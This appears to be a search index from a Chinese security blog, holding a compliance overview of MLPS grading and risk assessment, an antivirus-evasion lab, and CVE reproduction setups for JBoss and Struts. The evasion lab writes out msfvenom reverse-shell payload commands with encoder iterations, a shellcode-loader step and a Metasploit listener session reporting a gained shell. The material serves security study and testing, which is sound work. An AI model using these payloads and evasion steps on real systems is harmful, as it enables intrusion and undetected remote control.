[{"categories":["等级保护"],"content":"等级保护\u0026风险评估：了解基本测评流程，知道各角色岗位在测评工作中的职责，学习国标文件 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:0:0","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1 等级保护 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:0","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.1 等级保护概念 信息安全等级保护是指对国家秘密信息、法人和其他组织及公民的专有信息以及公开信息和存储、传输、处理这些信息的信息系统分等级实行安全保护，对信息系统中使用的信息安全产品实行按等级管理，对信息系统中发生的信息安全事件分等级响应、处置。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:1","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.2 等级保护依据 等级保护工作开展的依据是《中华人民共和国网络安全法》 第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少 于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。 伴随着《中华人民共和国网络安全法》的正式发布和实施，等级保护制度从一个规范性动作上升到了法律层面，确立了其在网络安全领域的基础、核心地位。简而言之，关键信息基础设施相关单位不按要求履行等保测评工作即是违法行为。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:2","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.3 为什么要强制实行等级保护 国家强制推进实行等保制度的原因来自内、外两个部分： 内部因素：随着信息化建设工作的发展和推进，网络安全工作也需要同步推进，以此来保障国家重要行业和关键环节的安全系数。 外部因素：攻击技术不断发展和迭代，境外敌对势力的入侵形势日益严峻。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:3","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.4 等级保护对象 等级保护对象是指网络安全等级保护工作中的对象，通常是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统，主要包括基础信息网络、云计算平台/系统、大数据应用/平台/资源、物联网(IoT)、工业控制系统和采用移动互联技术的系统等（简称：云大物移工）。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:4","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.5 安全保护等级 等级保护对象根据其在国家安全，经济建设，社会生活中的重要程度，遭到破坏后对国家安全、社会秩序、公共利益以及公民、法人和其他组织的合法权益的危害程度等，由低到高被划分为五个安全保护等级。 第五个等级涉及国家安全，未在国标文件列出具体内容，且普通人一般基础不到 等级 定义 安全保护能力 第一 级： 用户 自主 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益造成损害，但不 损害国家安全、社会秩序和 公共利益。 应能够防护免受来自个人的、拥有很少资源的威胁源发 起的恶意攻击、一般的自然灾难，以及其他相当危害程 度的威胁所造成的关键资源损害，在自身遭到损害后， 能够恢复部分功能。 第二 级： 系统 审计 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益产生严重损害， 或者对社会秩序和公共利益 造成损害，但不损害国家安 全。 应能够防护免受来自外部小型组织的、拥有少量资源的 威胁源发起的恶意攻击、一般的自然灾难，以及其他相 当危害程度的威胁所造成的重要资源损害，能够发现重 要的安全漏洞和处置安全事件，在自身遭到损害后，能 够在一段时间内恢复部分功能。 第三 级： 安全 标记 保护 级 等级保护对象受到破坏后， 会对公民、法人和其他组织 的合法权益产生特别严重损 害，或者对社会秩序和公共 利益造成严重损害，或者对 国家安全造成损害。 应能够在统一安全策略下防护免受来自外部有组织的团 体、拥有较为丰富资源的威胁源发起的恶意攻击、较为 严重的自然灾难，以及其他相当危害程度的威胁所造成 的主要资源损害,能够及时发现、监测攻击行为和处置 安全事件，在自身遭到损害后，能够较快恢复绝大部分 功能。 第四 级： 结构 化保 护级 等级保护对象受到破坏后， 会对社会秩序和公共利益造 成特别严重损害，或者对国 家安全造成严重损害。 应能够在统一安全策略下防护免受来自国家级别的、敌 对组织的、拥有丰富资源的威胁源发起的恶意攻击，严 重的自然灾难，,以及其他相当危害程度的威胁所造成 的资源损害，能够及时发现、监测发现攻击行为和安全 事件，在自身遭到损害后﹐能够迅速恢复所有功能。 第五 级： 访问 验证 保护 级 等级保护对象受到破坏后， 会对国家安全造成特别严重 损害。 略 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:5","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.6 等级保护角色\u0026职责 等级保护管理部门： 等级保护管理部门依照等级保护相关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。如：公安机关、国家保密局、国家密码局等； 主管部门： 负责依照国家网络安全等级保护的管理规范和技术标准，督促、检查和指导本行业、本部门或者本地区等级保护对象运营、使用单位的网络安全等级保护工作。 如：教育部或者所在地区的教育局； 运营、使用单位： 就是需要做等保测评的相关单位，如医院，学校，xx科技公司等； 网络安全服务机构： 可以协助测评对象做相应等保动作的相关单位，如：深信服、赛可达实验室、国家计算机网络应急技术处理协调中心等； 网络安全等级测评机构： 等保测评经公安部认证的具有资质的测评机构，依据国家信息安全等级保护规范规定，受有关单位委托，按照有关管理规范和技术标准，对信息系统安全等级保护状况进行检测评估的活动。简单理解为公安部授权的可以对测评对象发放证书的单位，如果想查询具备等保测评资质的厂商，可以访问网络安全等级保护网，在信息查询栏目中，点击全国网络安全等级测评与检测评估机构目录，可以看到各省市的测评机构名单和联系方式。 网络安全产品供应商： 提供相关安全产品的厂商，如：360、深信服、天融信、启明星辰、绿盟等； ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:6","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.7 等级保护规定动作 定级： 自主定级、专家评审、主管部门审批、公安机关审核监督。 备案： 定级工作完成后，经过专家评审、行业主管部门审核后，报送所在地公安机关进行备案。 安全建设或整改： 信息系统的安全保护等级确定后，运营、使用单位应当按照国家信息安全等级保护管理规范和技术标准，使用符合国家有关规定，满足信息系统安全保护等级需求的信息技术产品，开展信息系统安全建设或者改建工作。 等级测评： 信息系统建设完成后，运营、使用单位或者其主管部门应当选择符合本办法规定条件的测评机构，依据《信息系统安全等级保护测评要求》等技术标准，定期对信息系统安全等级状况开展等级测评。 监督检查： 信息系统运营、使用单位及其主管部门定期对信息系统安全状况、安全保护制度及措施的落实情况进行自查。受理备案的公安机关定期对备案系统的等级保护工作情况进行检查，若存在违规项，下发整改通知，必要时会采取规定处罚措施。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:7","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"1.8 基本实施流程 系统定级： 信息系统运营使用单位或主管部门按照《信息安全等级保护管理办法》和《网络安全等级保护定级指南》，初步确定定级对象的安全保护等级，起草《网络安全等级保护定级报告》；二级以上系统，定级结论需要进行专家评审、主管部门审核和备案。 系统备案： 信息系统安全保护等级为第二级以上时，备案时应当提交《网络安全等级保护备案表》和定级报告；第三级以上系统，还需提交专家评审意见、系统拓扑和说明、安全管理制度、安全建设方案等。公安机关一般会在10日内给予反馈，如果备案通过，会发放备案证明；如果备案不通过，需要重新定级。 系统初测： 测评机构按照管理规范和技术标准，运用科学的手段和方法，对处理特定应用的信息系统，采用安全技术测评和安全管理测评方式，对保护状况进行初步检测评估，针对安全不符合项提出安全整改建议。 等保整改： 依据《网络安全等级保护基本要求》，利用自有或第三方的安全产品和专家服务，对信息系统进行安全建设和整改，同时制定相应的安全管理制度。整改主要分为管理整改和技术整改。 复测获得报告： 运营使用单位应当选择合适的测评机构，依据《网络安全等级保护测评要求》等技术标准，定期对信息系统安全等级状况开展等级测评。测评结论分为优（90分及以上）、良（80分及以上）、中（70分及以上）、差（低于70分），70分以上才算基本符合要求。 监督检查： 向当地公安机关网安部门提交测评报告，配合完成对网络安全等级保护实施情况的检查。公安机关及其他监管部门会在整个过程中，履行相应的监管、审核和检查等职责。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:1:8","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2 风险评估 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:0","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.1 风险评估准备 确定风险评估的目标、范围、方法、标准和责任； 收集风险评估所需的内外部信息，包括历史数据和未来预测； 筛选、提炼、对比、分类、组合信息，以便进行风险评估。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:1","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.2 资产识别 识别风险评估对象的资产，包括物理资产、信息资产、人力资产等； 确定资产的价值、重要性、敏感性等属性； 确定资产的所有者和使用者。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:2","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.3 威胁识别 识别可能对资产造成损害或影响的威胁，包括自然威胁、人为威胁等； 确定威胁的来源、类型、频率、强度等特征； 确定威胁发生的条件和触发因素。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:3","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.4 脆弱性识别 识别资产存在的脆弱性，即可能被威胁利用的缺陷或漏洞； 确定脆弱性的程度、范围、持续时间等特征； 确定脆弱性产生的原因和影响因素。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:4","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.5 已有安全措施的确认 确认已经采取或计划采取的安全措施，包括技术措施、管理措施、法律措施等； 确定安全措施的有效性、合理性、成本效益等属性； 确定安全措施对威胁和脆弱性的影响程度。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:5","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"2.6 风险分析和交付风险评估记录 分析风险发生的可能性和影响程度，确定风险水平； 比较风险水平和风险承受度，确定风险是否可接受； 制定风险应对策略，包括风险承担、规避、转移、减轻等； 编制风险评估报告，记录风险评估过程和结果，提出风险管理建议。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:2:6","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["等级保护"],"content":"3 总结 等级保护、风险评估和安全测评区别是什么？ 等级保护是指对涉及国计民生的网络和信息系统按其重要程度及实际安全需求进行分等级保护，对网络和信息系统中使用的安全产品实行按等级管理，对网络和信息系统中发生的信息安全事件进行分等级响应、处置。它是保障国家网络和信息安全的基本制度、基本策略、基本方法。等级保护的核心是对信息系统特别是对业务应用系统安全分等级、按标准进行建设、管理和监督。国家对信息安全等级保护工作运用法律和技术规范逐级加强监管力度。 风险评估是指，在风险事件发生之前或之后(但还没有结束)，该事件给人们的生活、生命、财产等各个方面造成的影响和损失的可能性进行量化评估的工作。从信息安全的角度来讲，风险评估是对信息资产所面临的威胁、存在的弱点、造成的影响，以及三者综合作用所带来风险的可能性的评估。作为风险管理的基础，风险评估是组织确定信息安全需求的一个重要途径，属于组织信息安全管理体系策划的过程。 安全测评是指按照严格的程序对信息系统进行安全能力的综合测试评估活动，由正规、检验技术丰富且被政府授权资格的权威机构进行检查，帮助系统运行单位分析单位目前的安全运行状况、排查存在的安全问题，并提供改进建议降低系统的安全风险。 总之，等级保护是一种管理制度，风险评估是一种评价方法，安全测评是一种测试活动。三者都是为了提高信息系统的安全性能和防御能力，但侧重点和执行方式不同。 ","date":"2023-04-09","objectID":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/:3:0","tags":[],"title":"等级保护\u0026风险评估","uri":"/posts/dengbao/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"categories":["Anti-Virus"],"content":"MSF编码器结合shellcode加载器进行免杀实验 ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:0:0","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"1 实验环境 软件名称 版本 IP kali 6.0.0-kali3-amd64 172.31.5.9 ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:1:0","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"2 利用MSF实现免杀 免杀技术简介： 免杀技术全称为反杀毒技术， Anti-Virus 简称“免杀”，指是一种能使病毒木马免于被杀毒软件查杀的技术。免杀技术的涉猎面广泛，其中包含反汇编、逆向工程、系统漏洞等技术，内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。 ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:2:0","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"2.1 没有免杀的情况 直接生成一个木马文件5555.exe msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 -f exe -o 5555.exe 将此文件拷贝到windows机器（开启防火墙），会被发现并处理 将此木马文件上传到在线检测平台，观察到检测结果如下： https://www.virustotal.com/gui/home/upload ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:2:1","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"2.2 启用MSF自带免杀功能 Meatsploit 框架下免杀的方式之一就是使用MSF编码器。其功能是对攻击载荷文件进行重新的排列编码，改变可执行文件中的代码形状，避免被杀软认出。MSF 编码器可以将原可执行程序重新编码，生成一个新的二进制文件，该文件运行后，MSF 编码器会将原始程序解码到内存中并执行。 生成一个重新编码后的免杀程序6666.exe msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.31.5.7 lport=5555 x86/shikata_ga_nai -i 20 -f exe -o 6666.exe 将文件拷贝至windows后，并没有被防火墙检测到。再次上传到在线检测平台 https://www.virustotal.com/gui/home/upload 可以观察到免杀后比没有免杀前的效果更差了（实际上是因为各个防火墙已经升级了对这种免杀技术的检测和防护，因此免杀后实际上是增加了“我就是木马文件”的特征，更容易被检测到） ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:2:2","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"2.3 利用shellcode加载器进行免杀 在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 参考链接：简述获取shellcode的几种方式 - FreeBuf网络安全行业门户 生成一个shellcode文件crowsec.jpg msfvenom -p windows/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 7 -b '\\x00' lhost=172.31.5.9 lport=7777 -f raw -o crowsec.jpg 可以被windows防火墙检测到 将此文件上传进行检测 https://www.virustotal.com/gui/home/upload 被检测到的结果少了许多，免杀有一定效果 shellcode加载器（本次实验命名为ms.exe） 本身也算一个木马程序，将ms.exe上传检测结果如下： ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:2:3","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["Anti-Virus"],"content":"2.4 免杀木马利用 启动msf监听程序 ┌──(root㉿kali)-[~] └─# msfconsole -q msf6 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_tcp payload =\u003e windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u003e set lhost 172.31.5.9 lhost =\u003e 172.31.5.9 msf6 exploit(multi/handler) \u003e set lport 7777 lport =\u003e 7777 msf6 exploit(multi/handler) \u003e run [*] Started reverse TCP handler on 172.31.5.9:7777 将加载器ms.exe和上文生成的木马文件防止在同一目录下（IP：172.31.5.1）： 双击ms.exe，观察到成功获取远程机器的命令窗口 ","date":"2023-04-07","objectID":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/:2:4","tags":[],"title":"MSF编码器结合shellcode加载器实现免杀","uri":"/posts/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/"},{"categories":["CVE"],"content":"JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149） ","date":"2023-04-05","objectID":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/:0:0","tags":[],"title":"JBoss 5.x\u00266.x 反序列化漏洞（CVE 2017 12149）复现","uri":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/"},{"categories":["CVE"],"content":"1 实验环境 软件名称 版本 部署方式 IP JBoss jboss-6.1.0.Final docker run -d -p 8085:8080 –name JBoss docker.io/hackingpub/cve-2017-12149 176.122.183.173 ","date":"2023-04-05","objectID":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/:1:0","tags":[],"title":"JBoss 5.x\u00266.x 反序列化漏洞（CVE 2017 12149）复现","uri":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/"},{"categories":["CVE"],"content":"2 漏洞原理 JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149） 该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤 器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致 了攻击者可以在服务器上执行任意代码。 漏洞影响5.x和6.x版本的JBoss。 JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可 以在任何商业应用中免费使用。Java序列化：把Java对象转换为字节序列的过程。Java反序列化：指把 字节序列恢复为Java对象的过程。 Java序列化与反序列化作用：便于保存数据，或者进行数据传输。 漏洞出现在 Jboss 的 HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，源码在 jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEBINF\\classes\\org\\jboss\\invocation\\http\\servlet目录下的ReadOnlyAccessFilter.class文件中，其中 doFilter函数代码查看方式 : docker exec -it JBoss bash -c 'cat /jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class' ","date":"2023-04-05","objectID":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/:2:0","tags":[],"title":"JBoss 5.x\u00266.x 反序列化漏洞（CVE 2017 12149）复现","uri":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/"},{"categories":["CVE"],"content":"3 漏洞复现 安装好环境之后，直接使用jboss反序列化工具打开，成功执行命令。 ","date":"2023-04-05","objectID":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/:3:0","tags":[],"title":"JBoss 5.x\u00266.x 反序列化漏洞（CVE 2017 12149）复现","uri":"/posts/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/"},{"categories":["CVE"],"content":"S2-048 远程代码执行漏洞（CVE-2017-9791） ","date":"2023-04-01","objectID":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/:0:0","tags":["CVE","APACHE"],"title":"S2-048 远程代码执行漏洞（CVE-2017-9791）","uri":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/"},{"categories":["CVE"],"content":"1 实验环境 软件名称 版本 部署方式 IP Apache Struts latest docker run -d -p 8084:8080 –name apache-struts docker.io/piesecurity/apache-struts2-cve-2017-5638 172.31.5.7 